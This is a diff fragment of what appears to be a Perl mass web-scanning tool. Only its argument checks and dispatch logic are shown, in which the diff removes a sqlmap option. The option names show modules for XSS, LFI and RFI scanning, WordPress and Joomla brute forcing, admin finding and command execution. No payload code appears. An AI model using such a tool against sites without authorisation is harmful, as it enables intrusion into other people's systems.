+  $ua->cookie_jar({});
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## ARGUMENTS VERIFICATION (TARGET AND RANGIP)
 if ((defined $Target) || (defined $rangip)) {
-  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $ifinurl) && (!defined $unique) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
+  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $ifinurl) && (!defined $unique) && (!defined $misup) && (!defined $validation_text) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
   advise();
   }
 }
@@ -3727,7 +3705,7 @@ if ((defined $Target) || (defined $rangip)) {
 ############################################################################################################################################################################################
 ## ARGUMENTS VERIFICATION (TARGET AND RANGIP)
 if ((defined $replace) && (defined $with)) {
-  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $ifinurl) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
+  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $ifinurl) && (!defined $misup) && (!defined $validation_text) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $msites) && (!defined $mmails) && (!defined $wpbf) && (!defined $joombf)) {
   advise();
   }
 }
@@ -3810,7 +3788,7 @@ if (defined $mlevel) {
 	exit();
   }
   if ((defined $dork) || (defined $Target) || (defined $rangip)){
-    if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $wpbf) && (!defined $joombf) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails)) {
+    if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $madmin) && (!defined $msubdomain) && (!defined $wpbf) && (!defined $joombf) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mmails)) {
       submsearch();
       exit();
     }else{
@@ -3819,13 +3797,7 @@ if (defined $mlevel) {
 	    if (defined $misup) { misup();}
 	    if (defined $validation_text) {mvalidation();}
         if (defined $command) {mcommand();}
-        if (defined $mxss) {
-          if (defined $sqlmap) {
-	        mxss(); sqlmap();
-          }else{
-            mxss();
-	      }
-        }
+        if (defined $mxss) {mxss();}
 		if (defined $mlfi) { mlfi();}
 		if (defined $mjoomrfi) { mjoomrfi();}
 		if (defined $mwpadf) { mwpadf();}
@@ -3842,13 +3814,7 @@ if (defined $mlevel) {
 	    if (defined $misup) { misup();}
 	    if (defined $validation_text) {mvalidation();}
         if (defined $command) {mcommand();}
-        if (defined $mxss) {
-          if (defined $sqlmap) {
-	        mxss(); sqlmap();
-          }else{
-            mxss();
-	      }
-        }
+        if (defined $mxss) {mxss();}
 		if (defined $mlfi) { mlfi();}
 		if (defined $mjoomrfi) { mjoomrfi();}
 		if (defined $mwpadf) { mwpadf();}
@@ -3871,13 +3837,7 @@ if (defined $mlevel) {
     if (defined $misup) {misup();}
     if (defined $validation_text) { mvalidation();}
     if (defined $command) {mcommand();}
-    if (defined $mxss) {
-      if (defined $sqlmap) {
-	    mxss(); sqlmap();
-      }else{
-        mxss();
-	  }
-    }
+    if (defined $mxss) {mxss();}
 	if (defined $mlfi) { mlfi();}
 	if (defined $mjoomrfi) { mjoomrfi();}
 	if (defined $mwpadf) { mwpadf();}
